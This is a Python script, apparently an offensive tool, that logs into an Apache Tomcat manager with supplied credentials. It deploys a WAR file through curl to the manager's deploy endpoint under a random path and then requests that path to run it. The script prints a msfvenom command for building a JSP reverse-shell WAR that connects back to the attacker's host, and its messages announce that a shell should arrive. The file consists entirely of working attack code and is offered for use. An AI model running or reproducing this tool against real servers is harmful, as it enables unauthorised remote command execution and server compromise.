import os
import requests
import sys
import random
import string
import time

class bcolors:
    OKGREEN = '\033[92m'
    OKBLUE = '\033[94m'
    FAIL = '\033[91m'
    LIGHTGREY='\033[37m'
    ENDC = '\033[0m'
    ORANGE='\033[33m'

banner = """ _                            _    __        ___    ____  
| |_ ___  _ __ ___   ___ __ _| |_  \ \      / / \  |  _ \ 
| __/ _ \| '_ ` _ \ / __/ _` | __|  \ \ /\ / / _ \ | |_) |
| || (_) | | | | | | (_| (_| | |_    \ V  V / ___ \|  _ < 
 \__\___/|_| |_| |_|\___\__,_|\__|    \_/\_/_/   \_\_| \_\
                                                          
             _                 _           
 _   _ _ __ | | ___   __ _  __| | ___ _ __ 
| | | | '_ \| |/ _ \ / _` |/ _` |/ _ \ '__|
| |_| | |_) | | (_) | (_| | (_| |  __/ |   
 \__,_| .__/|_|\___/ \__,_|\__,_|\___|_|   
      |_|                                  

"""
print
print (bcolors.LIGHTGREY + banner + bcolors.ENDC)
print
print (bcolors.ORANGE + "For the exploit to work make sure you have curl instaled on you system using the command below\nSudo apt-get install curl"+ bcolors.ENDC)
print
print (bcolors.ORANGE + "To generate a WAR file use the command below\nmsfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f war > shell.war"+ bcolors.ENDC)
print
output_string = ''.join(random.SystemRandom().choice(string.ascii_letters + string.digits) for _ in range(10))
sess = requests.session()
IPAddress = raw_input(bcolors.OKBLUE + "Please enter the Tomcat Server IPAddress or the Hostname ===> ")
username = raw_input("Please enter the Tomcat Username ===> ")
password = raw_input("Please enter the Tomcat Password ===> ")
directory = raw_input("Please enter the exact directory/folder where the WAR file is located ===> ")
fname = raw_input("Please enter FileName of the WAR file ===> ")
WAR_FILE =  os.path.join(directory, fname)



url = "http://" + username + ":" + password + "@" + IPAddress + ":8080/manager/text/list"
authenthication = sess.get(url).text

if "401 Unauthorized" in authenthication:
    print (bcolors.FAIL + "[-] You credentials seems invalid can you please verify" + bcolors.ENDC)
    sys.exit(1)
else:
    print
    print (bcolors.OKGREEN + "[+] Correct credentials provided" + bcolors.ENDC)
    print
    upload = os.system("curl  --upload-file " + WAR_FILE + " http://" + username + ":" +"'"+ password +"'" + "@" + IPAddress + ":8080/manager/text/deploy?path=/" + output_string)
    print (upload)
    verify = "http://" + username + ":" + password  + "@" + IPAddress + ":8080/manager/text/list"
    print
    ver = sess.get(verify).text
    print
    if output_string in ver:
        print (bcolors.OKGREEN + "[+] Congratulation You have uploaded a shell successfully" + bcolors.ENDC)
        time.sleep(2)
        print (bcolors.OKGREEN + "[+] Executing the WAR File" + bcolors.ENDC)
        print (bcolors.OKGREEN + "[+] You should be getting a shell now........." + bcolors.ENDC)
        execute = "http://" + IPAddress + ":8080/"+ output_string
        sess.get(execute).text
    else:
        print (bcolors.FAIL + "[-] Sorry but it seems your shell was not uploaded can you retry" + bcolors.ENDC)
